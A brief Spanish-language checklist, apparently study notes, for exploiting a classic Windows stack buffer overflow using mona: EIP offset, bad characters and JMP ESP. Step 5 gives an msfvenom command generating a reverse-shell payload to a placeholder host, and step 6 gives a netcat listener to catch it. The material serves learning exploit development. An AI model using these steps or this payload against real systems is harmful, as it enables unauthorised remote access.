# Estructura básica del BoF en Windows
---
_Esta es una estructura básica de los pasos a seguir en Windows a la hora de explotar un Buffer Overflow básico y de los antiguos._

1. Crear un padding muy grande y ver si hay buffer overflow.
2. Tomar el control de EIP para ello:
 - !mona pattern_create 1000 (immunity) - mona.mona ("pattern_create 1000") (x32dbg)
 - Ver EIP y ver que elementos tiene.
 - Hacer una resta a mano comparando donde empieza y donde acaba // utilizar mona:
   - !mona pattern_offset xxxxxx - mona.mona ("patern offset xxxx")
3. Una vez tenemos el control de EIP, sacaremos los badchars. (Para que se guarde en logs: "!mona config -set workingfolder c:\logs\%p").
 - !mona bytearray -cpb "\x00" --> copiamos y pegamos en el script
 - Ejecutamos de nuevo el programa.
 - Lo vemos manualmente: Seccion de Hexdump --> Go to --> ESP --> Vemos cuando se rompe la cadena de bytearray
 - Con mona: "!mona compare -f C:\logs...bytearray.bin -a ADDRESS" --> Nos indica los badchars
 - Volvemos a generar el bytearray eliminando los badchars y volvemos a empezar hasta que no quede ninguna.
4. Buscaremos en el programa un JMP ESP que no tenga ASLR.
 - !mona jmp -r esp (immunity) - mona.mona ("jmp -r esp") (x32dbg)
 - Comprobamos que la direccion que seleccionamos no contiene badchars.
 - La colocamos en la direccion de retorno, que es EIP, el cual hemos controlado anteriormente.
5. Generar o buscar una shellcode/reverse shellcode.
````
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=4444 EXITFUNC=thread -b '\x00\x0a\x09\x1a' -a x86 --platform Windows -f python -v shellcode_reverse_shell
--smallest
````
6. Nos ponemos a la escucha:
````
 nc -lvnp 4444 // use exploit/multi/handler
````
7. Ejecutamos y... **FIN**
